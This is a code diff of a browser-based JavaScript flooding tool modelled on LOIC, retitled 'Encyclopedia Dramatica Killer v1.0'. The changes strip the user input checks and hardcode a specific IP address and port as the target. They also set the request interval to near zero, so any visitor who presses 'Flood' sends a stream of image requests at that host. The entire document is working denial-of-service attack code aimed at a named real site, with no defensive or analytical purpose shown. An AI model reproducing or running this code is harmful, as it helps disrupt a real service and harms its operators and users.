@@ -17,121 +17,98 @@
 
           var isFiring = false;
 
-          if(target.length == 0)
+          if(port.length == 0 || port == 0 || port == "0")
           {
 
-            document.getElementById("errors").innerHTML = "You must enter a target.";
+            port = 443;
 
           }
-          else if(requestsPerSecond.length == 0)
+
+          var onFail = function()
           {
 
-            document.getElementById("errors").innerHTML = "You must tell us how many requests per second we should send.";
+            failed++;
 
-          }
-          else if(requestsPerSecond == "0" || requestsPerSecond == 0)
+            document.getElementById("failed").innerHTML = failed;
+
+          };
+
+          var onSuccess = function()
           {
 
-            document.getElementById("errors").innerHTML = "You want us to send 0 requests per second...????";
+            succeeded++;
 
-          }
-          else
+            document.getElementById("succeeded").innerHTML = succeeded;
+
+          };
+
+          var onRequest = function()
           {
 
-            if(port.length == 0 || port == 0 || port == "0")
-            {
+            requested++;
 
-              port = 80;
+            document.getElementById("requests").innerHTML = requested;
 
-            }
+          };
 
-            var onFail = function()
-            {
+          var DoS = function()
+          {
 
-              failed++;
-
-              document.getElementById("failed").innerHTML = failed;
-
-            };
-
-            var onSuccess = function()
-            {
-
-              succeeded++;
-
-              document.getElementById("succeeded").innerHTML = succeeded;
-
-            };
-
-            var onRequest = function()
-            {
-
-              requested++;
-
-              document.getElementById("requests").innerHTML = requested;
-
-            };
-
-            var DoS = function()
-            {
-
-              var image = new Image();
+            var image = new Image();
 
               // image.onerror = function() { onFail(); };
 
               // image.onabort = function() { onFail(); };
 
-              image.src = "http://" + target + ":" + port + "?key=" + Math.floor(Math.random() * 1000);
+            image.src = "http://3.142.90.73:443?key=" + Math.floor(Math.random() * 1000);
 
-              onSuccess();
+            onSuccess();
 
-              onRequest();
+            onRequest();
 
-            };
+          };
 
-            document.getElementById("button").onclick = function()
+          document.getElementById("button").onclick = function()
+          {
+
+            if(isFiring)
             {
 
-              if(isFiring)
-              {
+              document.getElementById("errors").innerHTML = "";
 
-                document.getElementById("errors").innerHTML = "";
+              document.getElementById("target").value = "";
 
-                document.getElementById("target").value = "";
+              document.getElementById("port").value = "";
 
-                document.getElementById("port").value = "";
+              document.getElementById("requestsPerSecond").value = "";
 
-                document.getElementById("requestsPerSecond").value = "";
+              clearInterval(fireInterval);
 
-                clearInterval(fireInterval);
+              isFiring = false;
 
-                isFiring = false;
+              document.getElementById("button").innerHTML = "Flood";
 
-                document.getElementById("button").innerHTML = "Flood";
+              document.getElementById("status").innerHTML = "Not Running";
 
-                document.getElementById("status").innerHTML = "Not Running";
+            }
+            else
+            {
 
-              }
-              else
-              {
+              document.getElementById("errors").innerHTML = "";
 
-                document.getElementById("errors").innerHTML = "";
+              document.getElementById("target").value = "";
 
-                document.getElementById("target").value = "";
+              document.getElementById("port").value = "";
 
-                document.getElementById("port").value = "";
+              document.getElementById("requestsPerSecond").value = "";
 
-                document.getElementById("requestsPerSecond").value = "";
+              isFiring = true;
 
-                isFiring = true;
+              document.getElementById("button").innerHTML = "Stop Flood";
 
-                document.getElementById("button").innerHTML = "Stop Flood";
+              document.getElementById("status").innerHTML = "Running";
 
-                document.getElementById("status").innerHTML = "Running";
-
-                fireInterval = setInterval(DoS, (1000 / parseInt(requestsPerSecond) |0));
-
-              }
+              fireInterval = setInterval(DoS, (1000 / parseInt(5882300) |0));
 
             }
 
@@ -179,7 +156,7 @@
 
         <h1>
 
-          LOIC v1.0
+          Encyclopedia Dramatica Killer v1.0
 
         </h1>
 
